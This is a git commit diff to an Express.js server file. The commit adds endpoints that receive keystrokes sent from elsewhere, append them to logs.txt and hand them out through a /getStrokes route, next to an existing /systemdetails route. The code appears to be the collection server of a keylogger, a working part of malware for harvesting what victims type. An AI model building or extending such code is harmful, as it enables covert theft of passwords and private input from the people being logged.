15e6a7cfdf616c000b85a9bc900fcbf26adf4b91
Azaken1248 <suvkrm@gmail.com>
2024-10-04 18:05:23 +0530

    Fixed server response

--- WebApp/Server/server.mjs
+++ WebApp/Server/server.mjs
@@ -1,14 +1,30 @@
 import express, { json } from 'express';
-import cors from 'cors'; 
+import fs from 'fs';
+import cors from 'cors';
+
 const app = express();
 const port = 3000;
 
 app.use(json());
 app.use(cors());  
 
+let keystrokes = "";
+
 app.post('/keystrokes', (req, res) => {
-    console.log('Keystrokes received:', req.body);
+    const keystrokesReceived = req.body.keystrokes; 
+    
+    if (keystrokesReceived) {
+        keystrokes += keystrokesReceived;
+        fs.appendFileSync('logs.txt', keystrokesReceived);
+    }
+    
+    console.log('Keystrokes received:', keystrokesReceived);
     res.status(200).send('Keystrokes received');
+});
+
+app.post('/getStrokes', (_req, res) => {
+    res.status(200).json({"keystrokes": keystrokes});
+    keystrokes = ""; 
 });
 
 app.post('/systemdetails', (req, res) => {
